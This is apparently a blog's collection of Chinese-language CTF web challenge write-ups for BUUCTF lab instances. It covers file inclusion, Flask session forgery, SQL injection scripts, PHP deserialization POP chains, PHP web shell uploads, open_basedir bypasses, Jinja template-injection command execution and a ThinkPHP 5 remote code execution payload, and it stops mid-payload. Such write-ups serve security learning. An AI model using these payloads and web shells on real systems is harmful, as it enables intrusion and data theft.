warmup代码审计，定义了白名单，判断file参数问号之前的内容是不是在白名单里。利用文件包含漏洞（CVE-2018-2613），?file=hint.php?.././../../../../ffffllllaaaagggg，其中问号可以url编码，效果一样。 [HCTF] admin随便注册个账号，登录，在修改密码的地方发现一行注释，给了源码 方法1： session伪造 flask将session存储在客户端（浏览器），并且不对session进行加密，只进行签名，不能防止session被读取，但可以防止被篡改，得到签名后可以伪造session 登录后看下自己的session，读取一下 123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload)if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 拿到内容，在config.py发现密钥 ckj123，把得到的内容中的user改为admin，user_id改为1，伪造session（https://github.com/noraj/flask-session-cookie-manager），替换掉原来的session就可以得到flag 方法2：unicode欺骗 route.py的login函数和change函数里都有strlower这个操作，而不是正常的lower。 跟进一下，看到nodeprep.prepare，对应的库是twisted。 在requirements.txt中，twisted的版本是10.2.0，最新的是18，差距很大。查一下，这个函数会自动进行如下转换 ᴀ -&gt; A -&gt; a 于是我们注册ᴀ dmin，登录后变成Admin，改密码的时候就会改掉admin的密码，成功登录。 方法3：条件竞争 在login和change函数中都没有进行检查，而是先赋值到name和session.name，在已有登录的session情况下，登录admin，修改密码，就可以修改掉admin的密码，但是login函数进行了判断，可以开双线程绕过。 1234567891011121314151617181920212223242526272829303132333435363738394041import requestsimport threadingdef login(s, username, password): data = { 'username': username, 'password': password, 'submit': '' } return s.post(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/login&quot;, data=data)def logout(s): return s.get(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/logout&quot;)def change(s, newpassword): data = { 'newpassword':newpassword } return s.post(&quot;http://4f7f18d7-e9dd-44c1-a10d-0ed88b615dae.node3.buuoj.cn/change&quot;, data=data)def func1(s): login(s, 'skysec', 'skysec') change(s, 'skysec')def func2(s): logout(s) res = login(s, 'admin', 'skysec') if '&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;' in res.text: print('finish')def main(): for i in range(1000): print(i) s = requests.Session() t1 = threading.Thread(target=func1, args=(s,)) t2 = threading.Thread(target=func2, args=(s,)) t1.start() t2.start()if __name__ == &quot;__main__&quot;: main() ps：复现失败，预想的结果是会把admin的密码改为skysec，就可以登录。但实际上我可能是被buuctf给ban了 [HFCTF2020]EasyLoginNode.js 代码审计、弱类型、依赖库缺陷 static/js/app.js: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * 或许该用 koa-static 来处理静态文件 * 路径该怎么配置？不管了先填个根目录XD */function login() { const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); const token = sessionStorage.getItem(&quot;token&quot;); $.post(&quot;/api/login&quot;, {username, password, authorization:token}) .done(function(data) { const {status} = data; if(status) { document.location = &quot;/home&quot;; } }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });}function register() { const username = $(&quot;#username&quot;).val(); const password = $(&quot;#password&quot;).val(); $.post(&quot;/api/register&quot;, {username, password}) .done(function(data) { const { token } = data; sessionStorage.setItem('token', token); document.location = &quot;/login&quot;; }) .fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });}function logout() { $.get('/api/logout').done(function(data) { const {status} = data; if(status) { document.location = '/login'; } });}function getflag() { $.get('/api/flag').done(function(data) { const {flag} = data; $(&quot;#username&quot;).val(flag); }).fail(function(xhr, textStatus, errorThrown) { alert(xhr.responseJSON.message); });} 提示配置的静态目录是程序的根目录，可能存在任意文件读取，直接访问/app.js，得到源码。 [MRCTF2020]Ez_bypass12?id[]=1&amp;gg[]=2&amp;passwd[]=1234567passwd=1234567asdf md5 一个数组会返回 false，两个 false 相等。 利用弱类型，1234567asdf 转换为数字就是 1234567 [MRCTF2020]你传你🐎呢普通的文件上传，传文件时需要修改 content type 传一个 .htaccess 1SetHandler application/x-httpd-php 传一个 .jpg 格式的🐎就可以了。 1c=show_source('/flag'); [MRCTF2020]PYWebsiteF12，直接看到 flag.php，进去改XFF，127.0.0.1. [MRCTF2020]Ezpop123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier { protected $var; public function append($value){ include($value); } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __construct($file='index.php'){ $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;source; } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p; public function __construct(){ $this-&gt;p = array(); } public function __get($key){ $function = $this-&gt;p; return $function(); }}if(isset($_GET['pop'])){ @unserialize($_GET['pop']);}else $a=new Show; highlight_file(__FILE__);} 反序列化，POP链构造。 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Modifier { protected $var = 'php://filter/convert.base64-encode/resource=flag.php'; public function append($value){ include($value); // -1 var = flag.php } public function __invoke(){ $this-&gt;append($this-&gt;var); }}class Show{ public $source; public $str; public function __toString(){ return $this-&gt;str-&gt;source; // -4 str = Test } public function __wakeup(){ if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) { echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; } }}class Test{ public $p ; public function __get($key){ $function = $this-&gt;p; return $function(); // -2 p = Modifier }}$s1 = new Show();$s2 = new Show();$s1-&gt;source = $s2;$s2-&gt;str = new Test();$s2-&gt;str-&gt;p = new Modifier();echo urlencode(serialize($s1));?&gt; 触发 Show 的 toString 方法，需要一个 Show 对象（s1）的 source 是另一个 Show 对象。调用顺序$s1-&gt;__wakeup，$s1-&gt;source-&gt;__toString() 触发 Test 的 get 方法，可以把 s2 的 str 属性设置为一个 Test 对象，Show 的 toString 方法访问了 source 属性，而 Test 类不存在这个属性，可以触发。调用顺序$s2-&gt;str-&gt;source，$s2-&gt;str-&gt;__get()。 触发 Modifier 的 invoke 方法，在 Test 类中可以将 p 设置为 Modifier 的对象，可以触发。同时将 Modifier 的 var 变量设置为伪协议读取 flag.php。调用顺序$s2-&gt;str-&gt;p()，$s2-&gt;str-&gt;p-&gt;__invoke()。 最后的 urlencode 是必须的 [NPUCTF2020]ReadlezPHP反序列化 123456789101112131415161718&lt;?phpclass HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = -1; $this-&gt;b = &quot;phpinfo&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$s = new HelloPhp();echo serialize($s);?&gt; phpinfo 可以接受参数，-1 表示显示所有信息，flag 在 phpinfo 中 1time.php?data=O:8:%22HelloPhp%22:2:{s:1:%22a%22;i:-1;s:1:%22b%22;s:7:%22phpinfo%22;} [极客大挑战 2019]PHP题目提示有备份，下载www.zip。 根据class.php，我们需要传入一个Name对象，username是admin，password是100，同时还要绕过wakeup方法。 123456789101112&lt;?phpclass Name{ private $username; private $password; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; }}$f = new Name('admin',100);echo serialize($f);?&gt; 得到序列化后的字符串O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}，其中username和password都是private的变量，Name前后各有一个空字符，所以长度为14。为了绕过wakeup，将O:4:&quot;Name&quot;:2后面的2改为3（当说明的变量数大于实际变量数可以绕过wakeup方法）。 由于含有空字符，使用python发送请求。 123456import requestsurl = 'http://54603761-44c7-4fe6-81de-add413bc8939.node3.buuoj.cn/'params = {'select': 'O:4:&quot;Name&quot;:3:{s:14:&quot;\\0Name\\0username&quot;;s:5:&quot;admin&quot;;s:14:&quot;\\0Name\\0password&quot;;i:100;}'}r = requests.get(url, params=params)print(r.text) [极客大挑战 2019]Http源代码里看到Secret.php，根据提示改一下referer,xff和useragent [极客大挑战 2019]Knife用菜刀或者蚁剑连一下，flag在根目录 [极客大挑战 2019]EasySQLadmin' or 1=1 # [极客大挑战 2019]HardSQL过滤了 ascii, substr, by, =, &gt;, union, and, *。 报错注入，用 updatexml，用like代替=，?username=admin%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23&amp;password=123，?username=admin%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1))%23&amp;password=123。 [极客大挑战 2019]Secret File查看源代码，发现一个Archive_room.php，点Secret，提示回去再看看。 抓包，发现secr3t.php 1234567891011&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt; file=flag.php，提示我就在这里但你看不到。file=php://filter/read=convert.base64-encode/resource=flag.php，base64解密，得到flag [强网杯] 随便注输入引号，报错 1' or 1=1#，查询出所有内容 0' union select database()#，得到waf：return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); 尝试堆叠注入，用char绕过waf 123456789101112payload = &quot;0';set @s=concat(%s);PREPARE a FROM @s;EXECUTE a;&quot;exp = 'select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()'# 查表名# exp = &quot;select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='1919810931114514'&quot;# 查列名# exp = &quot;select flag from `1919810931114514`&quot;# 查flag，表名要使用反引号res = ''for i in exp: res += &quot;char(%s),&quot;%(ord(i))my_payload = payload%(res[:-1])print my_payload 得到类似下面的结果 10';set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(103),char(114),char(111),char(117),char(112),char(95),char(99),char(111),char(110),char(99),char(97),char(116),char(40),char(84),char(65),char(66),char(76),char(69),char(95),char(78),char(65),char(77),char(69),char(41),char(32),char(102),char(114),char(111),char(109),char(32),char(105),char(110),char(102),char(111),char(114),char(109),char(97),char(116),char(105),char(111),char(110),char(95),char(115),char(99),char(104),char(101),char(109),char(97),char(46),char(84),char(65),char(66),char(76),char(69),char(83),char(32),char(119),char(104),char(101),char(114),char(101),char(32),char(84),char(65),char(66),char(76),char(69),char(95),char(83),char(67),char(72),char(69),char(77),char(65),char(61),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));PREPARE a FROM @s;EXECUTE a; 也可以交换1919810931114514和words两个表的名字，这样正常查询就可以得到1919810931114514表里的内容 [极客大挑战 2019]FinalSQL注入点在点击按钮出现的 search.php/id=1 中，用异或符号进行盲注。 12345678import requestsurl = &quot;http://4e80936d-618a-4d1b-8913-910f41a86c5f.node3.buuoj.cn/search.php&quot;for i in range(1,20): for j in range(1,128): d =&quot;?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),'&quot;+str(i)+&quot;',1))='&quot;+str(j)+&quot;')^1&quot; r = requests.get(url+d) if 'Click' in r.text: print(chr(j)) [RoarCTF 2019]Easy JavaJava的站，点help看到filename=help.docx，可能存在文件包含。 java应用的安全目录是WEB-INF，访问其中的文件要通过 web.xml 进行相应映射才能访问。包括： WEB-INF/web.xml，Web应用配置文件，描述servlet和其他应用组件配置及命名规则。 WEB-INF/classes/，包含站点所有用的class文件，包括 servlet class 和非servlet class，不能包含在 .jar 文件中。 WEB-INF/lib/，存放web应用需要的 jar 文件，放置仅在这个应用中要求使用的 .jar 文件，例如数据库驱动 jar文件。 WEB-INF/src/，源码目录，按包结构放置各个 java 文件。 WEB-INF/database.properties，数据库配置文件。 访问WEB-INF/web.xml，用POST方法？，可以看到 1234&lt;servlet&gt; &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt; &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt; &lt;/servlet&gt; 访问这个 class 文件，WEB-INF/classes/com/wm/ctf/FlagController.class，可以看到一串 base64，解码得到flag。 [BJDCTF2020]Old HackThinkPHP 5 的RCE，直接上，?s=captcha，POST传_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag [BJDCTF2020]Easy MD5看响应头里有Hint: select * from 'admin' where password=md5($pass,true)，true是返回的十六进制MD5转化为字符串，输入ffifdyop，这个字符串转化之后是'or'6....。 然后是弱类型，传数组就可以a[]=1&amp;b[]=2。 然后是强类型，用 fastcoll，先生成两个md5值一样的文件 1./fastcoll_v1.0.0.5.exe source.txt 读取文件的时候要用二进制格式，因为含有文本格式解码不了的字符 12345678910import requestsurl = 'http://337b4ffe-e9cf-4213-a211-e49ab794d636.node3.buuoj.cn/levell14.php'with open('./1.txt', 'rb') as f1: with open('./2.txt', 'rb') as f2: t1 = f1.read() t2 = f2.read() data = {'param1': t1,'param2': t2} r = requests.post(url, data=data) print(r.text) [BJDCTF 2nd]假猪套天下第一随便输一个用户名和密码，看到提示L0g1n.php，在里面看到要99年后访问。在Cookie的 time 里改一个很大的数字，提示要从本地访问。X-Forwarded-For不行，换一个Client-ip。要从gem-love.com访问，改Referer。要从Commodo 64访问，查一下完整的 UA，是Commodore 64。要求邮箱，用From头。需要代理，用Via头。 Header 解释 示例 Accept 指定客户端能够接收的内容类型 Accept: text/plain, text/html,application/json Accept-Charset 浏览器可以接受的字符编码集。 Accept-Charset: iso-8859-5 Accept-Encoding 指定浏览器可以支持的web服务器返回内容压缩编码类型。 Accept-Encoding: compress, gzip Accept-Language 浏览器可接受的语言 Accept-Language: en,zh Accept-Ranges 可以请求网页实体的一个或者多个子范围字段 Accept-Ranges: bytes Authorization HTTP授权的授权证书 Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Cache-Control 指定请求和响应遵循的缓存机制 Cache-Control: no-cache Connection 表示是否需要持久连接。（HTTP 1.1默认进行持久连接） Connection: close Cookie HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。 Cookie: $Version=1; Skin=new; Content-Length 请求的内容长度 Content-Length: 348 Content-Type 请求的与实体对应的MIME信息 Content-Type: application/x-www-form-urlencoded Date 请求发送的日期和时间 Date: Tue, 15 Nov 2010 08:12:31 GMT Expect 请求的特定的服务器行为 Expect: 100-continue From 发出请求的用户的Email From: user@email.com Host 指定请求的服务器的域名和端口号 Host: www.zcmhi.com If-Match 只有请求内容与实体相匹配才有效 If-Match: “737060cd8c284d8af7ad3082f209582d” If-Modified-Since 如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码 If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT If-None-Match 如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变 If-None-Match: “737060cd8c284d8af7ad3082f209582d” If-Range 如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag If-Range: “737060cd8c284d8af7ad3082f209582d” If-Unmodified-Since 只在实体在指定时间之后未被修改才请求成功 If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT Max-Forwards 限制信息通过代理和网关传送的时间 Max-Forwards: 10 Pragma 用来包含实现特定的指令 Pragma: no-cache Proxy-Authorization 连接到代理的授权证书 Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ== Range 只请求实体的一部分，指定范围 Range: bytes=500-999 Referer 先前网页的地址，当前请求网页紧随其后,即来路 Referer: http://www.zcmhi.com/archives… TE 客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息 TE: trailers,deflate;q=0.5 Upgrade 向服务器指定某种传输协议以便服务器进行转换（如果支持） Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11 User-Agent User-Agent的内容包含发出请求的用户信息 User-Agent: Mozilla/5.0 (Linux; X11) Via 通知中间网关或代理服务器地址，通信协议 Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1) Warning 关于消息实体的警告信息 Warn: 199 Miscellaneous warning [RoarCTF] easy calc提示加了waf，看一下calc.php 123456789101112131415&lt;?php error_reporting(0); if(!isset($_GET['num'])){ show_source(__FILE__); }else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(&quot;what are you want to do?&quot;); } } eval('echo '.$str.';'); } ?&gt; num只允许输入数字和一些符号，把查询字符串?num=改为?%20num可以绕过，而且在calc.php处理时是一样的，原理是$_GET和$_POST解析字符串的问题，可以用来bypass。 接下来只需要绕过引号 ?%20num=var_dump(scandir(chr(47))) 列出当前目录下的文件，可以看到f1agg，读一下这个文件 ?%20num=var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 得到flag [SUCTF] easy sql查询语句是select $_POST['query'] || flag from flag（不知道怎么来的） payload:1;set sql_mode=PIPES_AS_CONCAT;select 1，PIPES AS CONCAT 把 || 视为字符串连接符而不是或运算， select 1 || flag 会合并 select 1 和select flag 的查询结果，如果用字母无法得到flag，因为会合并成类似 select aflag 的形式 [SUCTF 2019]PythonginxUnicode安全，可以参考博客里的另一篇文章，Host-Split attack。 123456789101112131415161718192021@app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == 'suctf.cc': return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; payload：/getUrl?url=file%3A//suctf.c%E2%84%82/../../../../etc/passwd，前两次没有问题，第三次会把%E2%84%82转化成c，可以任意文件读取。 读nginx配置文件，在/etc/nginx/conf.d/nginx.conf没发现，/usr/local/nginx/conf/nginx.conf找到注释/usr/fffffflag。 [SUCTF] checkin插入后缀名改成jpg的一句话，提示&lt;?in contents。 改成&lt;scriptlanguage=&quot;php&quot;&gt;，提示不是图片 文件开头加上GIF89a，成功上传。 服务器是nginx，不能上传.htaccess，需要利用.user.ini 在.user.ini中可以更改php.ini中的PHP_INI_PERDIR 和 PHP_INI_USER设置。 auto_prepend_file和auto_append_file会在php文件的前/后自动插入指定的文件。 上传.user.ini： 12GIF89aauto_prepend_file=ow.jpg 上传目录下有一个index.php文件，访问index.php即可执行我们上传的php文件。 [SUCTF] easy web看一下代码，大概是要进行到eval()函数执行get_the_flag()，然后通过文件上传拿shell。 第一步，正则过滤了茫茫多的字符，需要绕过。参考无字母数字shell，无字母数字shell提高篇，php异或shell，对字符串的长度，重复使用的字符也有要求。 接下来是php特性 12345678&lt;?php$_GET['a'];$_GET[a]; # 没有引号的字符视为字符串，所以以上两条等价$_GET{a}; # 字符串后面跟随大括号和中括号都把字符串看作一个数组，所以以上两种等价$a='phpinfo';$a(); # 动态调用函数，可以直接在字符串后加上括号把字符串当作函数名echo ab^cd; # 得到两个不可见字符，php可以直接对两个字符串进行异或操作，相当于两位两位分别异或?&gt; 于是使用不可见的字符绕过正则，同时使两个字符串异或得到_GET，${}没有被过滤，直接使用可以减少一个字符量。除了异或也可以使用取反或者自增。 12345678r = 255 # %fftarget = &quot;_GET&quot;res = []for t in target: for l in range(0, 255): if l ^ r == ord(t): res.append(hex(l))print(res) 得到/xa0/xb8/xba/xab，payload: 1?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag # $_GET{%ff}() 这样就可以执行get_the_flag()了 第二步文件上传，要求后缀中不存在ph，内容中不含&lt;?，还要通过exif_imagetype。使用.htaccess绕过后缀限制，用&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[c]);&lt;/script&gt;的方式上传shell，在.htaccess和shell签名加上GIF89a来绕过exif_imagetype的检测。 构造一个上传页面，用来上传两个文件 1234&lt;Form action=&quot;http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=get_the_flag&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/Form&gt; a.aaa文件： 1GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST['c']);&lt;/script&gt; 完了失败了，应该是在.htaccess前加的GIF89a导致文件失效了，换个方式。由于#在.htaccess中是注释符，不影响执行，同时这两条是图片文件头： 123#define width 123#define height 123AddType application/x-httpd-php .aaa 这时访问http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();发现返回的内容是GIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST['c']);&lt;/script&gt;，可能由于版本原因script标签指定的php不能起作用。改一下a.aaa文件，把&lt;?php @eval($_REQUEST[c]);?&gt;base64编码然后加到GIF89a后面，多加两个a是为了可以正常base64解码 1GIF89aaaPD9waHAgQGV2YWwoJF9SRVFVRVNUW2NdKTs/Pg== 读取文件内容时用的是file_get_contents，可以使用php伪协议base64解密，所以修改.htaccess： 1234#define width 123#define height 123AddType application/x-httpd-php .aaaphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa 访问http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=phpinfo();，成功拿到shell 蚁剑连接，html目录下有个假flag，再上层的目录提示无权限，在phpinfo可以看到设置了open_basedir 12This is fake flagBut I heard php7.2-fpm has been initialized in unix socket mode! oepn_basedir绕过，选择了chdir和ini_set合用的方式绕过 1http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/')); 发现根目录下的THis_Is_tHe_F14g，最终payload 1http://667a5d02-8472-42fe-bd78-90fd1a80ad73.node3.buuoj.cn/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/a.aaa?c=chdir(%27img%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);print_r(file_get_contents(%27/THis_Is_tHe_F14g%27)); extra：打印函数被禁用，如果curl可用，可以搭建一个靶机，把信息存入数据库或者文件，将回显信息发送到靶机，命令执行无回显时可以使用以下payload 1$_=&quot;xxx&quot;;?&gt;&lt;?=$_?&gt; 当system,passthru等不可用时，可以使用popen,proc_open等管道命令执行命令，也可以使用反引号，括起来的内容会作为shell命令执行，并将输出信息返回。 1$_=`ls`; 不能使用字母数字时也可以用通配符方式。 12/???/??? # /bin/cat/???/??? /???/???/???/?????.??? # /bin/cat /var/www/html/index.php [SWPU2019]Web1发布广告的标题位置存在注入，要在查询广告内容的时候触发。 发现 #-or会被waf，空格会被过滤，于是用/**/代替空格，在union select中闭合后面的单引号。 看看有多少列 1a' union select 1,1...1,1,'1 一度怀疑自己方法有问题，结果它TM有22列。第2、3位可以显示。由于or被过滤，没办法使用informationschema，查一下版本，MariaDB，可以使用mysql.innodb_table_stats，查到表名 123a'/**/union/**/select/**/1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22a'/**/union/**/select/**/1,(select group_concat(table_name) from mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 有FLAG_TABLE,news,users,gtid_slave_pos,ads,users几个表，接下来无列名注入。 1a'/**/union/**/select/**/1,(select/**/group_concat(c)/**/from/**/(select/**/1/**/a,2/**/b,3/**/c/**/union/**/select/**/*/**/from/**/users)d),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22 需要一个一个试出每个表有多少列。 [WUSTCTF2020]朴实无华intval 对于指数表示只会返回e前的内容。 md5 传入一个 0e215962017，md5后还是一个0e开头的数字，可以相等。 get_flag 先用 ls 看一下目录，找到flag，%09代替空格，ca\\t代替cat 1ca\\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag [WesternCTF2018]shrine服务端模板注入（SSTI），有工具 tqlmap，类似于sqlmap。 1234567891011121314151617181920212223242526import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG')@app.route('/')def index(): return open(__file__).read()@app.route('/shrine/&lt;path:shrine&gt;')def shrine(shrine): def safe_jinja(s): s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 访问/shrine/{{1+1}}，得到2，可以模板注入。源码中flag在config里，如果没有过滤可以用{{config}}直接获取，但是这里设置了黑名单并且过滤了括号。 但python有一些内置函数，比如url_for和get_flashed_messages，可用payload： 123/shrine/{{url_for.__globals__}} # 得到current_app/shrine/{{url_for.__globals__['current_app'].config}}/shrine/{{get_flashed_messages.__globals__['current_app'].config}} # 与上面类似 命令执行 1{%25 for c in [].__class__.__base__.__subclasses__() %25}%0A{%25 if c.__name__ %3D%3D 'catch_warnings' %25}%0A%20 {%25 for b in c.__init__.__globals__.values() %25}%0A%20 {%25 if b.__class__ %3D%3D {}.__class__ %25}%0A%20%20%20 {%25 if 'eval' in b.keys() %25}%0A%20%20%20%20%20 {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}%0A%20%20%20 {%25 endif %25}%0A%20 {%25 endif %25}%0A%20 {%25 endfor %25}%0A{%25 endif %25}%0A{%25 endfor %25} [网鼎杯 2020 朱雀组]phpwebF12看一下有个隐藏的表单，会自动提交。警告信息显示是执行了 func 这个函数，把 p 当作参数。尝试了几个命令执行函数都被 ban 了。 读一下源码 1file_get_contents(index.php) index.php： 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; 把 func 转换成小写，然后检查 ，不能在 disable func 里。func(p)_返回的结果必须是字符串（其实不重要）。 里面给出了一个类，有 destruct方法，可以反序列化绕过 disable func 的限制。 1234567891011121314151617181920&lt;?phpfunction gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;}}class Test { var $p = &quot;whoami&quot;; var $func = &quot;exec&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a = new Test();$s = serialize($a);unserialize($s); 验证可以执行命令，buu 的环境中 exec ls 只能看见 /var/www/html这一串目录，尝试用 system。 1func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:18:&quot;find / -name 